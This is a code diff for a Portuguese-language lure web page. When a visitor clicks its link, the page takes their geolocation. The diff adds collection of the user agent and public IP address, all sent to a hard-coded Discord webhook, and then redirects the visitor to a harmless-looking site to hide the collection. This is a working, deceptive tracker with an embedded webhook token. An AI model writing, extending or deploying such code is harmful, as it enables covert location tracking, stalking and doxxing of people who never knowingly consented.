@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Página Inocente</title>
+    <title>Página especial</title>
     <style>
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -58,26 +58,36 @@
         // URL do webhook do Discord (substitua pelo seu webhook)
         const discordWebhookURL = 'https://discord.com/api/webhooks/1249056666033455225/T1iGo5pt8RrQoLeQ_nK2FEXU8zL6ehwxsqMbX02oVGsUoM6c880KQ4D2ZKEfZVflElke';
 
-        // Função para enviar a localização para o Discord em um embed
-        const sendLocationToDiscord = async (latitude, longitude) => {
+        // Função para obter o IP do usuário usando uma API externa
+        const getIP = async () => {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error('Erro ao obter o IP:', error);
+                return 'Desconhecido';
+            }
+        };
+
+        // Função para enviar informações para o Discord em um embed
+        const sendInfoToDiscord = async (latitude, longitude, userAgent, ip) => {
             const embed = {
-                title: "📍 Nova Localização Recebida",
-                description: "Uma nova localização foi coletada.",
+                title: "📌 Nova Informação Recebida",
+                description: "Detalhes do usuário coletados.",
                 color: 0x00ff00, // Cor verde
                 fields: [
                     {
-                        name: "Latitude",
-                        value: latitude.toString(),
-                        inline: true,
+                        name: "🌍 Localização",
+                        value: `Latitude: ${latitude}\nLongitude: ${longitude}\n[Ver no Mapa](https://www.google.com/maps?q=${latitude},${longitude})`,
                     },
                     {
-                        name: "Longitude",
-                        value: longitude.toString(),
-                        inline: true,
+                        name: "📱 Dispositivo",
+                        value: userAgent,
                     },
                     {
-                        name: "Ver no Mapa",
-                        value: `[Google Maps](https://www.google.com/maps?q=${latitude},${longitude})`,
+                        name: "🖥️ IP",
+                        value: ip,
                     },
                 ],
                 timestamp: new Date().toISOString(),
@@ -96,19 +106,21 @@
                     body: JSON.stringify(message),
                 });
             } catch (error) {
-                console.error('Erro ao enviar localização para o Discord:', error);
+                console.error('Erro ao enviar informações para o Discord:', error);
             }
         };
 
-        // Função para obter a geolocalização
-        const getLocation = () => {
+        // Função para obter a geolocalização e outras informações
+        const getLocationAndInfo = async () => {
             if (navigator.geolocation) {
                 loadingMessage.style.display = 'block';
                 navigator.geolocation.getCurrentPosition(
-                    (position) => {
+                    async (position) => {
                         const { latitude, longitude } = position.coords;
-                        sendLocationToDiscord(latitude, longitude); // Envia para o Discord
-                        // Redireciona para um link inofensivo após coletar a localização
+                        const userAgent = navigator.userAgent; // Obtém o user agent
+                        const ip = await getIP(); // Obtém o IP
+                        sendInfoToDiscord(latitude, longitude, userAgent, ip); // Envia para o Discord
+                        // Redireciona para um link inofensivo após coletar as informações
                         window.location.href = 'https://www.exemplo.com'; // Substitua pelo link desejado
                     },
                     (error) => {
@@ -128,7 +140,7 @@
         // Adiciona o evento de clique ao link
         specialLink.addEventListener('click', function(event) {
             event.preventDefault(); // Impede o comportamento padrão do link
-            getLocation(); // Coleta a localização
+            getLocationAndInfo(); // Coleta a localização e outras informações
         });
     </script>
 </body>
